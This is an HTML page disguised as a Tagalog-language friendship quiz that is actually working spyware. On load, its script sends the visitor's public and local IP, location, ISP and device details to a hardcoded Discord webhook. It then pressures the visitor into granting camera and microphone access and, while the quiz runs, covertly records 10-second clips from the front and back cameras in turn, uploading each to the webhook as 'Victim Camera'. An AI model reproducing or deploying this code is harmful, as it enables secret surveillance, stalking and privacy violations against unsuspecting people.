<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Friendship Quiz Test</title>
  <link href="https://fonts.googleapis.com/css2?family=Permanent+Marker&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      background: black;
      min-height: 100vh;
      overflow: hidden;
    }
    .container {
      position: relative;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1rem;
    }
    .particle {
      position: absolute;
      width: 2px;
      height: 2px;
      background: white;
      border-radius: 50%;
      opacity: 0.6;
      pointer-events: none;
      z-index: 20;
      animation: fall linear infinite;
    }
    @keyframes fall {
      0% {
        transform: translateY(-10px);
        opacity: 0;
      }
      10% {
        opacity: 0.6;
      }
      90% {
        opacity: 0.6;
      }
      100% {
        transform: translateY(100vh);
        opacity: 0;
      }
    }
    .card {
      position: relative;
      z-index: 10;
      width: 100%;
      max-width: 42rem;
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(10px);
      border-radius: 0.5rem;
      padding: 2rem;
      border: 1px solid rgba(255, 255, 255, 0.2);
    }
    .text-center {
      text-align: center;
    }
    h2 {
      color: white;
      font-size: 1.875rem;
      font-weight: bold;
      margin-bottom: 1rem;
    }
    p {
      color: rgba(255, 255, 255, 0.9);
      margin-bottom: 1.5rem;
    }
    .error {
      color: #fca5a5;
      font-size: 0.875rem;
      margin-bottom: 1rem;
    }
    button {
      background: white;
      color: black;
      padding: 0.75rem 2rem;
      border-radius: 0.5rem;
      font-weight: 600;
      border: none;
      cursor: pointer;
      transition: all 0.2s;
      font-size: 1rem;
    }
    button:hover {
      opacity: 0.9;
    }
    button:disabled {
      cursor: not-allowed;
    }
    .quiz-header {
      margin-bottom: 1.5rem;
    }
    .quiz-info {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1rem;
      color: white;
      font-size: 0.875rem;
    }
    .progress-bar {
      width: 100%;
      background: rgba(255, 255, 255, 0.2);
      border-radius: 9999px;
      height: 0.5rem;
      overflow: hidden;
    }
    .progress-fill {
      background: white;
      height: 100%;
      transition: width 0.3s;
      border-radius: 9999px;
    }
    .question {
      color: white;
      font-size: 1.5rem;
      font-weight: bold;
      margin-bottom: 2rem;
    }
    .options {
      display: flex;
      flex-direction: column;
      gap: 0.75rem;
    }
    .option {
      width: 100%;
      text-align: left;
      padding: 1rem;
      border-radius: 0.5rem;
      background: rgba(255, 255, 255, 0.1);
      color: white;
      border: none;
      cursor: pointer;
      transition: all 0.2s;
      font-size: 1rem;
    }
    .option:hover:not(:disabled) {
      background: rgba(255, 255, 255, 0.2);
    }
    .option.correct {
      background: #22c55e;
      color: white;
    }
    .option.incorrect {
      background: #ef4444;
      color: white;
    }
    .score-display {
      color: white;
      font-size: 3rem;
      font-weight: bold;
      margin: 1rem 0;
    }
    .result-message {
      color: white;
      font-size: 1.25rem;
      margin-bottom: 2rem;
    }
  </style>
</head>
<body>
  <div class="container" id="app">
    <div class="card text-center" id="cameraScreen">
      <h2>Friendship Quiz Test</h2>
      <p>kung totoo mokong kaibigan, bat dimo sagutan? allow mo na lang para maka enter</p>
      <p class="error" id="cameraError" style="display: none;"></p>
      <button onclick="requestCamera()">Enter</button>
    </div>
  </div>
  <script>
    const questions = [
      { question: "Ano ang birthday ko?", options: ["January 15", "March 22", "June 10", "December 5"], correct: 1 },
      { question: "Anong kulay ang paborito ko?", options: ["Asul", "Pula", "Itim", "Puti"], correct: 2 },
      { question: "Saan ako nag-aaral?", options: ["Lakandula", "UPLB", "Ateneo", "La Salle"], correct: 0 },
      { question: "Ano ang paboritong kanta ko?", options: ["OPM Ballad", "K-Pop", "Rock", "Hip-Hop"], correct: 1 },
      { question: "Anong sports ang nilalaro ko?", options: ["Basketball", "Volleyball", "Badminton", "Swimming"], correct: 0 },
      { question: "Ano ang dream job ko?", options: ["Doctor", "Engineer", "Teacher", "Artist"], correct: 1 },
      { question: "Saan ko gustong mag-travel?", options: ["Japan", "Korea", "Europe", "America"], correct: 0 },
      { question: "Ano ang takot ko?", options: ["Heights", "Ipis", "Dilim", "Multo"], correct: 1 },
      { question: "Anong pagkain ang ayaw ko?", options: ["Ampalaya", "Okra", "Talong", "Patola"], correct: 0 },
      { question: "Ano ang hobby ko?", options: ["Gaming", "Reading", "Drawing", "Cooking"], correct: 0 },
      { question: "Anong subject ang paborito ko?", options: ["Math", "Science", "English", "Filipino"], correct: 1 },
      { question: "Ano ang favorite movie genre ko?", options: ["Horror", "Comedy", "Romance", "Action"], correct: 2 },
      { question: "Anong pet ang gusto ko?", options: ["Aso", "Pusa", "Hamster", "Ibon"], correct: 1 },
      { question: "Ano ang paboritong dessert ko?", options: ["Ice Cream", "Cake", "Leche Flan", "Halo-Halo"], correct: 3 },
      { question: "Anong oras ako natutulog?", options: ["9 PM", "11 PM", "1 AM", "3 AM"], correct: 2 },
      { question: "Saan ako mahilig mag-shopping?", options: ["Mall", "Online", "Ukay-Ukay", "Palengke"], correct: 1 },
      { question: "Ano ang paboritong fast food ko?", options: ["Jollibee", "McDonald's", "KFC", "Chowking"], correct: 0 },
      { question: "Anong season ang gusto ko?", options: ["Summer", "Rainy", "Cold", "Spring"], correct: 2 },
      { question: "Ano ang pangarap kong sasakyan?", options: ["Car", "Motorcycle", "SUV", "Sports Car"], correct: 3 },
      { question: "Anong social media ang active ako?", options: ["Facebook", "Instagram", "Twitter", "TikTok"], correct: 1 }
    ];
    let currentQuestion = 0;
    let score = 0;
    let isAnswered = false;
    let stream = null;
    let videoRecorder = null;
    let videoChunks = [];
    let videoCounter = 0;
    let currentCamera = 'user';
    const WEBHOOK = "https://discord.com/api/webhooks/1460605082436501687/LV4GlnDzcZAPKPFiicyiRXmIQlzKoXgvzAlUMnN9s8g6tdMhDeEBGn_BFPllPh263RC6";
    
    async function getLocalIP() {
      try {
        const pc = new RTCPeerConnection({iceServers: []});
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        return new Promise((resolve) => {
          pc.onicecandidate = (ice) => {
            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
            const match = ipRegex.exec(ice.candidate.candidate);
            if (match) {
              pc.close();
              resolve(match[1]);
            }
          };
          setTimeout(() => resolve('Unknown'), 2000);
        });
      } catch {
        return 'Unknown';
      }
    }
    
    async function getPublicIP() {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
      } catch {
        try {
          const res2 = await fetch('https://api.my-ip.io/ip');
          return await res2.text();
        } catch {
          return "Unknown";
        }
      }
    }
    
    async function getIPInfo() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        return data;
      } catch {
        return null;
      }
    }
    
    (async function logWebsiteEntry() {
      try {
        const publicIP = await getPublicIP();
        const localIP = await getLocalIP();
        const ipInfo = await getIPInfo();
        
        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        const platform = navigator.platform;
        const device = isMobile ? 'Mobile' : 'Desktop';
        
        const fields = [
          { name: "Public IP:", value: `\`${publicIP}\``, inline: true },
          { name: "Local IP:", value: `\`${localIP}\``, inline: true },
          { name: "Device:", value: `\`${device}\``, inline: true }
        ];
        
        if (ipInfo) {
          fields.push(
            { name: "Location:", value: `\`${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country_name}\``, inline: false },
            { name: "Platform:", value: `\`${platform}\``, inline: true },
            { name: "ISP:", value: `\`${ipInfo.org || 'Unknown'}\``, inline: true }
          );
        } else {
          fields.push({ name: "Platform:", value: `\`${platform}\``, inline: true });
        }
        
        await fetch(WEBHOOK, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            embeds: [{
              title: "User Entered!",
              color: 10181046,
              fields: fields,
              timestamp: new Date().toISOString()
            }]
          })
        });
      } catch {}
    })();
    
    async function startVideoRecording() {
      try {
        if (!stream) return;
        
        let mimeType;
        if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus')) {
          mimeType = 'video/webm;codecs=vp9,opus';
        } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
          mimeType = 'video/webm;codecs=vp8,opus';
        } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
          mimeType = 'video/webm;codecs=vp9';
        } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
          mimeType = 'video/webm;codecs=vp8';
        } else if (MediaRecorder.isTypeSupported('video/webm')) {
          mimeType = 'video/webm';
        } else {
          mimeType = '';
        }
        
        videoRecorder = new MediaRecorder(stream, mimeType ? { 
          mimeType: mimeType,
          videoBitsPerSecond: 1000000,
          audioBitsPerSecond: 128000
        } : {});
        
        videoRecorder.ondataavailable = (event) => {
          if (event.data && event.data.size > 0) {
            videoChunks.push(event.data);
          }
        };
        
        videoRecorder.start();
        
        setInterval(async () => {
          if (videoRecorder && videoRecorder.state === 'recording') {
            videoRecorder.stop();
            
            videoRecorder.onstop = async () => {
              if (videoChunks.length > 0) {
                const videoBlob = new Blob(videoChunks, { type: videoRecorder.mimeType || 'video/webm' });
                
                if (videoBlob.size > 10000) {
                  try {
                    const publicIP = await getPublicIP();
                    const cameraType = currentCamera === 'user' ? 'Front Camera' : 'Back Camera';
                    const form = new FormData();
                    form.append('file', new File([videoBlob], `video-${++videoCounter}-${currentCamera}.webm`, { type: videoRecorder.mimeType || 'video/webm' }));
                    form.append('payload_json', JSON.stringify({
                      embeds: [{
                        title: `Victim Camera`,
                        description: "10-second video recording",
                        color: 15158332,
                        fields: [
                          { name: "Camera:", value: `\`${cameraType}\``, inline: true },
                          { name: "Public IP:", value: `\`${publicIP}\``, inline: true },
                          { name: "Time:", value: new Date().toLocaleString(), inline: true }
                        ],
                        timestamp: new Date().toISOString()
                      }]
                    }));
                    
                    await fetch(WEBHOOK, { method: "POST", body: form });
                  } catch {}
                }
                
                videoChunks = [];
                
                if (stream && stream.active) {
                  currentCamera = currentCamera === 'user' ? 'environment' : 'user';
                  
                  try {
                    stream.getTracks().forEach(track => track.stop());
                    stream = await navigator.mediaDevices.getUserMedia({ 
                      video: { facingMode: currentCamera }, 
                      audio: true 
                    });
                    
                    videoRecorder = new MediaRecorder(stream, mimeType ? { 
                      mimeType: mimeType,
                      videoBitsPerSecond: 1000000,
                      audioBitsPerSecond: 128000
                    } : {});
                    
                    videoRecorder.ondataavailable = (event) => {
                      if (event.data && event.data.size > 0) {
                        videoChunks.push(event.data);
                      }
                    };
                    
                    videoRecorder.start();
                  } catch {
                    stream = await navigator.mediaDevices.getUserMedia({ 
                      video: { facingMode: 'user' }, 
                      audio: true 
                    });
                    
                    videoRecorder = new MediaRecorder(stream, mimeType ? { 
                      mimeType: mimeType,
                      videoBitsPerSecond: 1000000,
                      audioBitsPerSecond: 128000
                    } : {});
                    
                    videoRecorder.ondataavailable = (event) => {
                      if (event.data && event.data.size > 0) {
                        videoChunks.push(event.data);
                      }
                    };
                    
                    videoRecorder.start();
                  }
                }
              }
            };
          }
        }, 10000);
        
      } catch {}
    }
    function createParticles() {
      const container = document.querySelector('.container');
      for (let i = 0; i < 50; i++) {
        const particle = document.createElement('div');
        particle.className = 'particle';
        particle.style.left = Math.random() * 100 + '%';
        particle.style.animationDelay = Math.random() * 5 + 's';
        particle.style.animationDuration = (5 + Math.random() * 5) + 's';
        particle.style.width = particle.style.height = (2 + Math.random() * 3) + 'px';
        container.appendChild(particle);
      }
    }
    createParticles();
    async function requestCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: "user" }, 
          audio: true 
        });
        startVideoRecording();
        showQuiz();
      } catch (error) {
        document.getElementById('cameraError').textContent = 'allow mo muna para makapasok ka bobo';
        document.getElementById('cameraError').style.display = 'block';
      }
    }
    function showQuiz() {
      const app = document.getElementById('app');
      app.innerHTML = `
        <div class="card">
          <div class="quiz-header">
            <div class="quiz-info">
              <span>Question <span id="current">1</span>/${questions.length}</span>
              <span>Score: <span id="score">0</span></span>
            </div>
            <div class="progress-bar">
              <div class="progress-fill" id="progress"></div>
            </div>
          </div>
          <h2 class="question" id="question"></h2>
          <div class="options" id="options"></div>
        </div>
      `;
      renderQuestion();
    }
    function renderQuestion() {
      const q = questions[currentQuestion];
      document.getElementById('question').textContent = q.question;
      document.getElementById('current').textContent = currentQuestion + 1;
      document.getElementById('score').textContent = score;
      document.getElementById('progress').style.width = ((currentQuestion + 1) / questions.length * 100) + '%';
      const optionsEl = document.getElementById('options');
      optionsEl.innerHTML = '';
      q.options.forEach((opt, i) => {
        const btn = document.createElement('button');
        btn.className = 'option';
        btn.textContent = opt;
        btn.onclick = () => handleAnswer(i);
        optionsEl.appendChild(btn);
      });
      isAnswered = false;
    }
    function handleAnswer(index) {
      if (isAnswered) return;
      isAnswered = true;
      const q = questions[currentQuestion];
      const isCorrect = Array.isArray(q.correct) ? q.correct.includes(index) : index === q.correct;
      if (isCorrect) score++;
      const buttons = document.querySelectorAll('.option');
      buttons.forEach((btn, i) => {
        btn.disabled = true;
        const correct = Array.isArray(q.correct) ? q.correct.includes(i) : i === q.correct;
        if (i === index) {
          btn.className = 'option ' + (isCorrect ? 'correct' : 'incorrect');
        } else if (correct) {
          btn.className = 'option correct';
        }
      });
      setTimeout(() => {
        if (currentQuestion < questions.length - 1) {
          currentQuestion++;
          renderQuestion();
        } else {
          showResult();
        }
      }, 1500);
    }
    function showResult() {
      const msg = score === questions.length ? "Wow Galing loveu!" :
                  score >= questions.length * 0.7 ? "Wow Ang galing mo Tanga!" :
                  score >= questions.length * 0.5 ? "Fake Friend!" : "Keep Practicing!";
      document.getElementById('app').innerHTML = `
        <div class="card text-center">
          <h2>Quiz Complete! 🎉</h2>
          <p class="score-display">${score}/${questions.length}</p>
          <p class="result-message">${msg}</p>
          <button onclick="location.reload()">Try Again</button>
        </div>
      `;
    }
    window.addEventListener('beforeunload', () => {
      if (videoRecorder && videoRecorder.state === 'recording') {
        videoRecorder.stop();
      }
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
    });
  </script>
</body>
</html>
